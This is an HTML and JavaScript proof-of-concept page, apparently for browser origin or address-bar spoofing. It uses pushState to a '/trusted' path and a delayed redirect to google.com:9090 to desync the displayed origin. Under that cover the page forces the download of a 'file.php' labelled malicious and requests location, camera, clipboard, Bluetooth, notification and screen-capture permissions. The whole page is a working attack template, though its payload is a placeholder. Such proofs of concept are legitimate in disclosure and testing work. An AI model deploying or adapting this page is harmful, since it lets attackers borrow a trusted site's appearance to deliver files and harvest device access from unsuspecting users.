<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync Login PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

.download-button {
  margin-top:20px;
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}

video { width:100%; margin-top:10px; }

pre {
  margin-top:12px;
  background:#111;
  color:#0f0;
  padding:10px;
  font-size:11px;
  max-height:260px;
  overflow:auto;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Download File</h2>
  <div class="sub">Click below to download file.php</div>

  <button class="download-button" onclick="downloadFile()">
    Download File (file.php)
  </button>

  <hr>

  <button onclick="getLocation()">Get Location</button>
  <p id="locationOutput">Location: -</p>

  <button onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <hr>

  <!-- 🔥 API FINGERPRINTING -->
  <button onclick="callAllAPIs()">CALL ALL APIs</button>
  <button onclick="clearLog()">CLEAR LOG</button>
  <pre id="apiLog"></pre>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const apiLog = document.getElementById('apiLog');

/* ======================
   FUNGSI ASLI (TIDAK DIUBAH)
====================== */
function downloadFile() {
  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
  const fileUrl = URL.createObjectURL(fileBlob);

  const downloadLink = document.createElement('a');
  downloadLink.href = fileUrl;
  downloadLink.download = 'file.php';
  document.body.appendChild(downloadLink);
  downloadLink.click();
  document.body.removeChild(downloadLink);
}

function getLocation() {
  const output = document.getElementById('locationOutput');
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    pos => output.textContent =
      `${pos.coords.latitude}, ${pos.coords.longitude}`,
    () => output.textContent = 'Permission denied'
  );
}

function openCamera() {
  navigator.mediaDevices.getUserMedia({ video:true })
    .then(s => camera.srcObject = s)
    .catch(()=>alert('Camera denied'));
}

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});

/* ======================
   API FINGERPRINTING
====================== */
const log = m => apiLog.textContent += m + "\n";
const clearLog = () => apiLog.textContent = "";

async function callAllAPIs() {
  log("=== API FINGERPRINT START ===");

  // Geolocation API
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => log("Geolocation: " + pos.coords.latitude + ", " + pos.coords.longitude),
      err => log("Geolocation: Permission denied")
    );
  }

  // Notification API
  if (Notification) {
    const permission = await Notification.requestPermission();
    log("Notification: " + permission);
  }

  // Clipboard API
  try {
    await navigator.clipboard.writeText("Test Clipboard");
    log("Clipboard: OK");
  } catch {
    log("Clipboard: Permission denied");
  }

  // Camera API
  try {
    await navigator.mediaDevices.getUserMedia({ video: true });
    log("Camera: OK");
  } catch {
    log("Camera: Permission denied");
  }

  // Web Bluetooth API
  if ('bluetooth' in navigator) {
    try {
      await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
      log("Web Bluetooth: OK");
    } catch {
      log("Web Bluetooth: Permission denied");
    }
  }

  // Device Orientation API
  if (window.DeviceOrientationEvent) {
    window.addEventListener('deviceorientation', (e) => {
      log("Device Orientation: " + e.alpha);
    });
  }

  // Web Share API
  if (navigator.share) {
    try {
      await navigator.share({ title: "Test", text: "Check this out!", url: window.location.href });
      log("Web Share: OK");
    } catch {
      log("Web Share: Permission denied");
    }
  }

  // Screen Capture API
  try {
    await navigator.mediaDevices.getDisplayMedia();
    log("Screen Capture: OK");
  } catch {
    log("Screen Capture: Permission denied");
  }

  // Web Storage API (LocalStorage & SessionStorage)
  try {
    localStorage.setItem('test', '1');
    sessionStorage.setItem('sessionTest', '1');
    log("Web Storage: OK");
  } catch {
    log("Web Storage: Error");
  }

  log("=== API FINGERPRINT END ===");
}
</script>

</body>
</html>
